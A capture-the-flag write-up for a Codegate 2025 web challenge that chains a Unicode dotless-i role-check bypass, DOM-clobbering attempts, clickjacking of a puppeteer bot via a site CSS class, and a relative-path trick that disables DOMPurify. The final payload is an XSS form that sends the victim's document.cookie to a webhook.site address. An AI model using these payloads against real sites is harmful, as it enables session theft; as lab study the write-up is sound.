_Written by jia_jie and hal0g3n_

# Privilege escalation

Firstly, we have to get into the website. So we quickly register and login, and the below page shows.

![](/codegate25quals/home.png)

🤔 we are able to change our `ROLE`, but to what?

```javascript:user.js
router.post('/role', authenticateJWT, (req, res) => {
    const { role } = req.body;
    const token = setRole(req.user.uuid, role);

    if (!token) return res.status(400).json({ message: "Invalid Role." });
    res.json({ message: "Role Changed.", token });
});
```

The route to change role does not reveal much, so we step into `setRole` and take peek.

```javascript:userModel.js
const role_list = ["ADMIN", "MEMBER", "INSPECTOR", "DEV", "BANNED"];

function checkRole(role) {
    const regex = /^(ADMIN|INSPECTOR)$/i;
    return regex.test(role);
}

...

const setRole = (uuid, input) => {
    const user = getUser(uuid);

    if (checkRole(input)) return false;
    if (!role_list.includes(input.toUpperCase())) return false;

    users.set(uuid, { ...user, role: input.toUpperCase() });
    const updated = getUser(uuid);
    const payload = { uuid, ...updated }
    delete payload.password;
    const token = generateToken(payload);
    return token;
};
```
Hidden in these 3 functions, is our first exploit to obtain privilege escalation.

# Encodings

Let's breakdown `setRole()`, it performs these 3 steps:

1. `checkRole(input)` - checks the input against the regex `/^(ADMIN|INSPECTOR)$/i`
    - A convoluted way to check if `input == admin || input == inspector` (`/i` indicating case insensitive)
2. `!role_list.includes(input.toUpperCase())` - checks `input.toUpperCase()` is in the list
3. Sets `role: input.toUpperCase()`

With the title of this subsection, the missing `.toUpperCase()` in step 1 jumps out, and we can in fact abuse it. Due to how javascript handles characters and their uppercase, there are special characters mapping to `I` in `toUpperCase()`. One example is the dotless i `ı` (`U+0131`). So we just put our role as:

`admın` or `ınspector`

And the regex would be none the wiser.

![](/codegate25quals/role_changed.png)

Now we can MASQUERADE as any role we want 😈

> `ADMIN` is used to give us permission to make posts, but not report them. We need to swap to `INSPECTOR` to report them for our XSS below

# XSS part 1

Now we are finally able to make posts and submit them to the /report endpoint, we can finally start tackling the XSS.

![Example post](/codegate25quals/post_example.png)

Looking at `index.js`, we can see the app sets a rather strict security policy:

```javascript:index.js
app.use((req, res, next) => {
    const nonce = crypto.randomBytes(16).toString('hex');

    res.setHeader("X-Frame-Options", "deny");

    if (req.path.startsWith('/admin')) {
        res.setHeader("Content-Security-Policy", `default-src 'self'; script-src 'self' 'unsafe-inline'`);
    } else {
        res.setHeader("Content-Security-Policy", `default-src 'self'; script-src 'nonce-${nonce}'`);
    }

    res.locals.nonce = nonce;

    next();
});
```

Hence, although there is no sanitization performed on post content (shown below), we aren't able to execute any javascript.

```html:post/view.ejs
        <div class="post-content">
            <%- post.content %>
        </div>
```

# Dead ends

One of the first things that I tried was redirecting the bot to /admin by passing a post id like `../admin/test`, where there is a more lenient CSP that allows inline scripts. However, the /report endpoint checks that the post id is valid before continuing:

```javascript:routes/report.js
    const post_id = req.params.post_id;
    const post = getPostById(post_id);

    if (!post) return res.status(404).json({ message: "Post Not Found." });
```

However, the bot does have some form of interaction with the page, which we could exploit:

```javascript:utils/report.js
        await page.goto(`http://localhost:3000/post/${post_id}`, { timeout: 3000, waitUntil: "domcontentloaded" });

        await delay(1000);

        const button = await page.$('#delete');
        await button.click();

        await delay(1000);
```

I tried a number of ways to exploit this behavior and redirect the bot to /admin. Looking at post/view.ejs, we can see `window.conf` being used to set the redirect url:

```javascript:post/view.ejs
        <% if (isOwner || isAdmin) { %>
            window.conf = window.conf || {
                deleteUrl: "/post/delete/<%= post.post_id %>"
            };
        <% } else { %>
            window.conf = window.conf || {
                deleteUrl: "/error/role"
            };
        <% } %>

...

        const deleteButton = document.querySelector("#delete");

        deleteButton.addEventListener("click", () => {
            location.href = window.conf.deleteUrl;
        });
```

So if we're able to set `window.conf.deleteUrl`, we can redirect to `/admin/test`. I recalled that elements can be accessed from the window object using their id, for example:

```html
<div id="conf"></div>
```

and `window.conf` will point to `HTMLDivElement`. However, we also need to set the `deleteUrl` attribute. I discovered that by using a form element, we are able to set properties directly using the input names, like so:

```html
<form name="conf">
  <input name="deleteUrl" value="/admin/test">
</form>
```

However, there is a problem: `window.conf.deleteUrl` points to `[object HTMLInputElement]`; we need to call `window.conf.deleteUrl.value` to get `/admin/test`. We need a html element where we can control its `toString()` value just from its html attributes alone.

Consulting my large language model of choice, I learn that `a` tags return their `href` attribute when stringified: for example, `<a href="/admin/test"></a> -> "/admin/test"`. But submitting a post with the `a` tag triggers the mystery filter. Fortunately, there was another element that was not blacklisted: `<area>`, which similarly uses `href` as its string representation.

Unfortunately, form elements only add valid input fields as attributes: `input`, `textarea`, `select` and `button`, none of which provide a useful `toString` implementation. Having no way to add an area tag under `window.conf`, we have to abandon this approach.

I also tried using a meta tag: `<meta http-equiv="refresh" content="0;url=https://example.com">`. However, the `meta` tag was also blacklisted by the app's mystery filter. (After the CTF, I learned that other participants bypassed it using slashes instead of spaces: `<meta/http-equiv="refresh"/content="0;url=https://example.com">`.)

> **DOM Clobbering Solution**
>
> Reading other participants' solutions after the CTF ended, I realised it's actually possible using the following payload (from @tanknight):
>
> ```html
> <a id=conf></a>
> <a id=conf name=deleteUrl href=http://xssendpoint></a>
> ```

# Clickjacking

After doing some googling, I realised that when another element overlaps the one puppeteer is clicking, that element is clicked instead. This is because puppeteer just moves the mouse to the x/y location and clicks:

```typescript
  async click(
    this: ElementHandle<Element>,
    options: Readonly<ClickOptions> = {}
  ): Promise<void> {
    await this.scrollIntoViewIfNeeded();
    const {x, y} = await this.clickablePoint(options.offset);
    await this.frame.page().mouse.click(x, y, options);
  }
```

So if we create a massive button that covers the entire screen, it should be clicked instead of the delete button:

```html
<form action="/admin/test">
  <button type="submit" style="position: absolute; top: 0; left: 0; width: 100vw; height: 100vh;"></button>
</form>
```

However, this doesn't render as expected:

![](/codegate25quals/clickjacking_1.png)

Checking the console, we see this is because of the CSP blocking inline styles:

![](/codegate25quals/style_csp_error.png)

Thus, we can only use existing styles served by the app. I checked the css files and found the following "css gadget":

```css:switch.css
.slider {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: #ccc;
    -webkit-transition: .4s;
    transition: .4s;
}
```

Now using the following payload, the button renders correctly and gets clicked by the bot (I verified this using webhook)

```html
<link rel="stylesheet" href="/css/switch.css" />
<form action="https://webhook.site/26d62c0b-fd91-4f30-9f78-152de98c1012">
  <button type="submit" class="slider"></button>
</form>
```

Now that we can redirect to /admin/test, hopefully we have more luck with XSS there.

# XSS part 2

Achieving XSS on `/admin/test` is no easy feat, especially due to the site using DOMPurify `3.2.4`, the latest version of it. No way we are bypassing DOMPurify with a 0day.

```html:admin/test.html
<script src="../js/purify.min.js"></script>
<script>
    const post_title = document.querySelector(".post_title");
    const post_content = document.querySelector(".post_content");
    const error_div = document.querySelector(".error_div");

    const urlSearch = new URLSearchParams(location.search);
    const title = urlSearch.get('title');
    const content = urlSearch.get('content');

    if (!title && !content) {
        post_content.innerHTML = "Usage: ?title=a&content=b";
    } else {
        try {
            post_title.innerHTML = DOMPurify.sanitize(title);
            post_content.innerHTML = DOMPurify.sanitize(content);
        } catch {
            post_title.innerHTML = title;
            post_content.innerHTML = content;
        }
    }
</script>
```

However, the `try/catch` block jumps out, in such a small file, this make it seem intentional, especially when our XSS is not `DOMurify.sanitize` when there is an error.

# Relativity

`DOMPurify.sanitize` does not throw any errors, since worst comes to worst it will still output `""` unless configured otherwise. There is another way to kill, and that is by removing the `DOMPurify` object completely. This sounds crazy but it is possible, especially since it is included in the _relative_ path `../js/purify.min.js`. If we could just access this same site with another route, we can effectively break this path.

This turned out to be a lot easier than expected. All we need is to include an additional slash, going to the route `/admin/test/`. That extra slash resulted in the path resolving to `/admin/test` instead of `/test` in the express backend, meaning instead of pointing to `/js/purify.min.js`, we access `/admin/js/purify.min.js`. `DOMPurify` now returns 404 and we get our unfiltered XSS.

Payload: `/admin/test/?content=<script>alert(1);</script>`

![](/codegate25quals/admin_test_xss.png)

# Final Payload

```html
<link rel="stylesheet" href="/css/switch.css" />
<form action="/admin/test/">
  <input
    type="hidden"
    name="content"
    value="<img src=x onerror=location.href=`https:\/\/webhook.site\/26d62c0b-fd91-4f30-9f78-152de98c1012?t=${document.cookie}`>"
  />
  <button type="submit" class="slider"></button>
</form>
```

We add the `/` to the form action as well as our XSS attack in the post, and we obtain our jwt with the flag:

`codegate2025{16a7eeb64ec6b150c9308509a039cec0c137dfd766ef13ccb8d6d9e0cf54aef3}`
